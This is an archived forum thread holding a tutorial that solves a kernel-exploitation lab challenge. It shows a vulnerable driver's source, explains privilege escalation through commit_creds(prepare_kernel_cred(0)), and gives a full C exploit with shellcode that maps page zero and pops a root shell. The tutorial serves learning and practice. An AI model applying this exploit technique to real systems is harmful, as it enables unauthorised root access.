<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Kernel Exploitation | Dereferencing a NULL pointer! - Exploit Development - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="NULL Pointer dereference
In the name of Allah, the most beneficent, the most merciful. 


Hello everyone to a boring article once again. :smiley:

I‚Äôve found a bit of freetime, so i decided to write this article, it isn‚Äô&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="3850.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="PbSLLmssSyzyYil88oIthYcMP"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="PbSLLmssSyzyYil88oIthYcMP"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Kernel Exploitation | Dereferencing a NULL pointer!&#39;" href="3850.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/kernel-exploitation-dereferencing-a-null-pointer/3850" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/kernel-exploitation-dereferencing-a-null-pointer/3850" />
<meta property="og:title" content="Kernel Exploitation | Dereferencing a NULL pointer!" />
<meta name="twitter:title" content="Kernel Exploitation | Dereferencing a NULL pointer!" />
<meta property="og:description" content="NULL Pointer dereference In the name of Allah, the most beneficent, the most merciful.    Hello everyone to a boring article once again. üòÉ  I‚Äôve found a bit of freetime, so i decided to write this article, it isn‚Äôt really well done, but i hope you guys like it and learn much üòä!  Kernel Exploitation ?  Many of the people here probably never faced a kernel exploitation challenge‚Ä¶ So, i‚Äôve decided that it‚Äôs a good choice to write about kernel exploitation a bit, and demonstrate some fe..." />
<meta name="twitter:description" content="NULL Pointer dereference In the name of Allah, the most beneficent, the most merciful.    Hello everyone to a boring article once again. üòÉ  I‚Äôve found a bit of freetime, so i decided to write this article, it isn‚Äôt really well done, but i hope you guys like it and learn much üòä!  Kernel Exploitation ?  Many of the people here probably never faced a kernel exploitation challenge‚Ä¶ So, i‚Äôve decided that it‚Äôs a good choice to write about kernel exploitation a bit, and demonstrate some fe..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="exploit" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="kernel" />
<meta property="og:article:tag" content="pwning" />
<meta property="og:article:tag" content="linux" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="3 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="30 ‚ù§" />
<meta property="article:published_time" content="2017-10-10T19:40:48+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="3850.html">Kernel Exploitation | Dereferencing a NULL pointer!</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/exploit-development/53.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #92278F'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Exploit Development</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/exploit.html' class='discourse-tag' rel="tag">exploit</a>, 
            <a href='../../tag/exploitation.html' class='discourse-tag' rel="tag">exploitation</a>, 
            <a href='../../tag/kernel.html' class='discourse-tag' rel="tag">kernel</a>, 
            <a href='../../tag/pwning.html' class='discourse-tag' rel="tag">pwning</a>, 
            <a href='../../tag/linux.html' class='discourse-tag' rel="tag">linux</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Kernel Exploitation | Dereferencing a NULL pointer!'>
      <link itemprop='url' href='3850.html'>
      <meta itemprop='datePublished' content='2017-10-10T19:40:47Z'>
        <meta itemprop='articleSection' content='Exploit Development'>
      <meta itemprop='keywords' content='exploit, exploitation, kernel, pwning, linux'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>

                <link itemprop="mainEntityOfPage" href="3850.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png">

              <span class="crawler-post-infos">
                  <time  datetime='2017-10-10T19:40:48Z' class='post-time'>
                    October 10, 2017,  7:40pm
                  </time>
                  <meta itemprop='dateModified' content='2017-10-10T20:11:48Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h2>NULL Pointer dereference</h2>
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<ul>
<li>Hello everyone to a boring article once again. <img src="../../images/emoji/twitter/smileyc164.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">
</li>
<li>I‚Äôve found a bit of freetime, so i decided to write this article, it isn‚Äôt really well done, but i hope you guys like it and learn much <img src="../../images/emoji/twitter/blushc164.png?v=9" title=":blush:" class="emoji" alt=":blush:">!</li>
</ul>
<h3>Kernel Exploitation ?</h3>
<ul>
<li>Many of the people here probably never faced a kernel exploitation challenge‚Ä¶</li>
<li>So, i‚Äôve decided that it‚Äôs a good choice to write about kernel exploitation a bit, and demonstrate some few basic stuff on it.</li>
<li>Instead of just popping a shell, it won‚Äôt lead to nothing, we need to raise our permissions first!</li>
</ul>
<h3>NULL Pointer dereference ?</h3>
<ul>
<li>It‚Äôs when a <strong>uninitialized or zero-ed out pointer</strong> is dereferenced, leading to making the <em>PC/IP (Program counter/ Instruction pointer)</em> point to 0, therefore, making the kernel panic!</li>
<li>The first thing is to check what protections are ON, in our case, all protections are turned OFF! ( Including Supervisor Mode Execution Prevention ) Which is similiar to DEP/NX ( No-Execute protection on user-land ) and also mmap_min_addr ( Don‚Äôt allow mmap()'ing a NULL address ), lucky us‚Ä¶</li>
<li>On ring0 modules, the goal differs, while in ring3 binaries we just focus on popping a shell, and enjoying the binary privileges, we need this time to modify our permissions. Luckily, there are some kernel structures, holding the current process privileges. What we‚Äôll try doing is leveraging our credentials to root ones, and popping a shell after doing so.</li>
</ul>
<h3>How will we raise credentials ?</h3>
<ul>
<li>Before starting, we need to know what we should deal with:</li>
<li>Each process informations is stored as a <strong>task_struct</strong>!</li>
<li><em>a look on <strong>sched.h</strong> file:</em></li>
</ul>
<pre><code class="lang-auto">struct task_struct {
/* ... */
/* Process credentials: */
/* Tracer's credentials at attach: */
const struct cred __rcu *ptracer_cred;
/* Objective and real subjective task credentials (COW): */
const struct cred __rcu *real_cred;
/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu *cred;
/* ... */
}
</code></pre>
<ul>
<li><em>There‚Äôs the effective subjective task credentials, declared as a cred struct!</em></li>
<li><em>a look on <strong>cred.h</strong> file:</em></li>
</ul>
<pre><code class="lang-auto">struct cred {
/* ... */
  kuid_t		uid;		/* real UID of the task */
  kgid_t		gid;		/* real GID of the task */
  kuid_t		suid;		/* saved UID of the task */
  kgid_t		sgid;		/* saved GID of the task */
  kuid_t		euid;		/* effective UID of the task */
  kgid_t		egid;		/* effective GID of the task */
/* ... */
}
</code></pre>
<ul>
<li>Here we‚Äôll focus on the effective UID of the task ( euid declared as a kuid_t ); if we somehow succedd to set it‚Äôs value to 0, the current task will have root privileges!</li>
</ul>
<h3>How are we supposed to find them ?</h3>
<ul>
<li>Making use of some kernel symbols!<br>
Some functions can be used to leverage the current process credentials, their addresses are static, and can easily be reteived from a file, depending on the kernel we are dealing with:</li>
<li>
<em>/proc/kallsyms</em>, <em>/proc/ksyms</em>, <em>/dev/ksyms</em>‚Ä¶<br>
<em>Some of these functions are declared in cred.c</em>.<pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>extern int commit_creds(struct cred <em>);<br>
/</em> ‚Ä¶ */<br>
extern struct cred *prepare_kernel_cred(struct task_struct *);</p>
<pre><code class="lang-auto">
- as we can see, the return value of **prepare_kernel_cred**() function is of type _struct cred *_, that we'll need to pass as an argument later to **commit_creds**(), so it can assign our freshly gained privileges to our current process!
- As a conclusion: we'll elevate our privileges by calling: **commit_creds**(**prepare_kernel_cred**(0));

- Understanding the vulnerability and how to trigger it!
An important thing before starting to write the exploit, is to know how to trigger the vulnerability itself! Know where that pointer is dereferenced and on what circumstances..

&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/e/e58140d7c67306779986d2c1a0aaf8580d1b1b03.png" width="300" height="440"&gt;
_**TADAAAAAAAAAAAAAAAAAAAAAAAAAAAA BORING THEORY**_

### Solving a Kernel challenge..

- And here we go again, let's check the challenge we were given.
Let's start by checking the protections:
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/8/8aabb7459a979b2ddb579390da9224f97c41bf3c.png" width="690" height="173"&gt;
We are safe, all protections are OFF!
- On this function _tostring\_write()_, we can see that commands should always start with 10 '*'..
- When this kernel module is loaded, it'll call it's constructor, once on each run.
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/1/179ffc021f3443e19df2e395345121c502a00f43.png" width="394" height="107"&gt;
- We can see that it will call _tostring\_create()_; This function is responsible in setting the function pointer in _tostring\_s struct_!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/4/4f684ecf0148b1459b570ce78acaafebd0b7b8c7.png" width="519" height="168"&gt;
- This is important, keep it in mind. So, the two pointers are set once on each run ( or if requested )..
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/f/f281d055f9fffdf1a46fde00811f60bd9b5aa80c.png" width="690" height="183"&gt;
- Now we can easily recognize the vulnerable function, which is the following;
 ```c
 static ssize_t tostring_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
char *bufk;
int i,j;
printk(KERN_INFO "Tostring: write()\n");
bufk = kmalloc(len + 1, GFP_DMA);
if (bufk){
  if (copy_from_user(bufk, buf, len))
      return -EFAULT;
  bufk[len] = '\0';
  i=0;
  while(i &lt;len) {
    for (j=0;(j&lt;10) &amp;&amp; (bufk[j]=='*');j++);
    if (j == 10) {
      for (j=i+10;(bufk[j]!='\0') &amp;&amp; (bufk[j] != '\n');j++);
      bufk[j]='\0';
      printk("Tostring: Cmd %s\n",bufk+i+10);
      switch(bufk[i+10]) {
      case 'H':
        tostring-&gt;tostring_read= tostring_read_hexa;
        break;
      case 'D':
        tostring-&gt;tostring_read= tostring_read_dec;
        break;
      case 'S':
        printk("Tostring: Delete stack\n");
        kfree(tostring-&gt;tostring_stack);
        tostring-&gt;tostring_stack=NULL;
        tostring-&gt;tostring_read=NULL;
        tostring-&gt;pointer=0;
        tostring-&gt;pointer_max=0;
        break;
      case 'N':
        printk("Tostring: Stack create with size %ld\n",local_strtoul(bufk+i+11,NULL,10));
        if (tostring-&gt;tostring_stack==NULL) tostring_create(local_strtoul(bufk+i+11,NULL,10));
        if (tostring-&gt;tostring_stack==NULL) printk("Tostring: Error, impossible to create stack\n");
        break;
      }
      i=j+1;
    }
    else {
      printk("tostring: insertion %lld\n",*((long long int *) (bufk+i)));
      if (tostring-&gt;pointer &gt;= tostring-&gt;pointer_max)
        printk(KERN_INFO "Tostring: Stack full\n");
      else
        tostring-&gt;tostring_stack[(tostring-&gt;pointer)++]= *((long long int *) (bufk+i));
      i = i+sizeof(long long int);
    }
  }
kfree(bufk);
}
return len;
}
</code></pre>
<ul>
<li>As we can see, there‚Äôs a switch on what‚Äôs after the ten ‚Äò*‚Äô, the most interesting one here‚Ä¶ is ‚ÄòS‚Äô case. It will nullset the function pointer tostring_read, which is good for us!</li>
<li>But, after setting it to null, we need to read from it, to cause it‚Äôs dereferencing, to do so, we will simply read the file, to trigger a call to <em>tostring_read()</em>!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/5/56f1c8628af7f8f50d74f12475dbdfdcda87d92e.png" width="553" height="105">
</li>
<li>We  are good, let‚Äôs start writting our exploit. We were used on writting exploits with Python <img src="../../images/emoji/twitter/cryc164.png?v=9" title=":cry:" class="emoji" alt=":cry:">, We‚Äôll be now using C instead‚Ä¶</li>
<li>Let‚Äôs start by writting a simple one, to trigger the call and zero-out the function pointer.</li>
</ul>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
/**/
#define vulnerable_device "/dev/tostring"
/**/
void main(void){
   int fd;
   char payload[15];
   /**/
   memset(payload, '*', 10);
   /**/
   payload[10] = 'S';
   payload[11] = 0;
   /**/
   fd = open(vulnerable_device, O_RDWR);
   if(fd &lt; 0){
   	printf("Couldn't open device!");
   }
   /**/
   write(fd, payload, 12);
}
</code></pre>
<ul>
<li>We are good for now, but we still need to cause it to dereference, only by reading the file, we can do that.<pre><code class="lang-auto"></code></pre>
</li>
</ul>
<p>read(fd, 0, 1);</p>
<pre><code class="lang-auto">
- Oh yeah, we got it, we made **IP** point to 0.. 
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/6/6bc8da76c8a9d6d08532ddaa0494cce9f75c6664.png" width="642" height="53"&gt;
- Now, lucky us, **mmap_min_addr** protection is **OFF**. We can allocate a small area in NULL, and place our shellcode which going to raise our privileges..
- Let's get **prepare_kernel_cred** and **commit_creds** addresses from _/proc/kallsyms_!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/f/f0c266369e02e64be1724dd6f03156a03c23ce02.png" width="586" height="52"&gt;
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/a/a76fb602e4d508411edc16f331937b18cd0a1d05.png" width="229" height="20"&gt;
- Now, i'll use rasm2, to make a small shellcode!
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/9/9120df60878d62287e68e26d176a9fb628faaadf.png" width="641" height="50"&gt;
- The shellcode does the following:
&lt;img src="//0x00sec.s3.amazonaws.com/original/2X/3/39efc3c8d432a58e06b4c8a8e340933a97e8b8e5.png" width="690" height="110"&gt;
- Let's add the shellcode part, before causing pointer dereference to our exploit!
```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
/**/
#define vulnerable_device "/dev/tostring"
/**/
void pop_shell(){
  system("sh");
}
/**/
void main(void){
  int fd;
  char payload[15];
  char shellcode[15] = "\x31\xc0\xe8\xe9\x11\x07\xc1\xe8\x74\x0e\x07\xc1\xc3";
  /**/
  memset(payload, '*', 10);
  /**/
  payload[10] = 'S';
  payload[11] = 0;
  /**/
  fd = open(vulnerable_device, O_RDWR);
  if(fd &lt; 0){
  	printf("Couldn't open device!");
  }
  write(fd, payload, 12);
  /**/
  mmap(NULL, sizeof(shellcode), PROT_EXEC |PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS |MAP_FIXED, -1, 0);
  memcpy(NULL, shellcode, sizeof(shellcode));
  /**/
  read(fd, 0, 1);
  /**/
  pop_shell();
}
</code></pre>
<ul>
<li>Let‚Äôs compile it, and run it!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/7/70c5e85fedf1abe09fca8d48be8c855135fcf155.png" width="643" height="114">
</li>
<li>And here comes our root shell poppin‚Äô!<br>
<img src="../../../0x00sec.s3.amazonaws.com/original/2X/1/1b9b92bc42c399d62352e127ab34a6d0d94f9d88.png" width="389" height="54">
</li>
</ul>
<hr>
<ul>
<li>Hope you guys enjoyed this small article, and learned as well!</li>
</ul>
<p>~ exploit</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="27" />
              <span class='post-likes'>27 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/k3rnelmaster.html'><span itemprop='name'>k3rnelmaster</span></a>
                (K3rnelmaster)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-10-22T05:52:43Z' class='post-time'>
                    October 22, 2017,  5:52am
                  </time>
                  <meta itemprop='dateModified' content='2017-10-22T05:52:43Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>It‚Äôs a good tutorial  <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
It‚Äôs very helpful to understand what ‚Äúdereferencing a null pointer‚Äù is.<br>
Thank you exploit~</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-10-23T12:47:31Z' class='post-time'>
                    October 23, 2017, 12:47pm
                  </time>
                  <meta itemprop='dateModified' content='2017-10-23T12:47:31Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>You are welcome, happy it helped you! <img src="../../../0x00sec.org/images/emoji/twitter/blushc164.html?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
